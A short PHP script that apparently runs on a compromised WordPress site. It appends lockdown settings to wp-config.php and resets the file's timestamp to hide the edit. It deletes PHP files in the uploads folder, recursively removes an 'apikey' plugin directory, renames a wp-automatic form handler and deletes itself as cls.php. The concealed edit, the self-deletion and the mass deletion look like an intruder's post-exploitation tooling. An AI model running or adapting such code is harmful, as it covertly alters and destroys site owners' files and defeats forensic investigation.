<?php
$config = file_get_contents("./wp-config.php");
if(strstr($config,"DISALLOW_FILE_EDIT")){
	echo "already repair";
}else{
	$hgb = "define('DISALLOW_FILE_EDIT', true);". PHP_EOL ."define('DISALLOW_FILE_MODS', true);";
	$config = $config. PHP_EOL .$hgb;
	$ftime = filemtime("./wp-config.php");
	file_put_contents("./wp-config.php",$config);
	touch("./wp-config.php", $ftime, $ftime);
	echo "repair success";
}
$y = date('m');
if (false != ($klop = opendir ( './wp-content/uploads/2021/'.$y ))){
     while ( false !== ($file = readdir ( $klop )) ) {
        if (strstr($file,".php")) {
			unlink('./wp-content/uploads/2021/'.$y.'/'.$file);
        }
    }
    closedir ( $klop );
}
function deldir($dir){
	$dh=opendir($dir);
	while ($file=readdir($dh)) {
		if($file!="." && $file!=".."){
			$fullpath=$dir."/".$file;
			if(!is_dir($fullpath)) {
				unlink($fullpath);
			}else{
				deldir($fullpath);
			}
		}
	}
	closedir($dh);
	if(rmdir($dir)){
		return true;
	}else{
		return false;
	}
}
if(is_dir("./wp-content/plugins/apikey")){
	deldir('./wp-content/plugins/apikey');
}
if(is_file('./wp-content/plugins/wp-automatic/process_form.php')){
	rename('./wp-content/plugins/wp-automatic/process_form.php','./wp-content/plugins/wp-automatic/process_ai_form.php');
}
unlink("./cls.php");
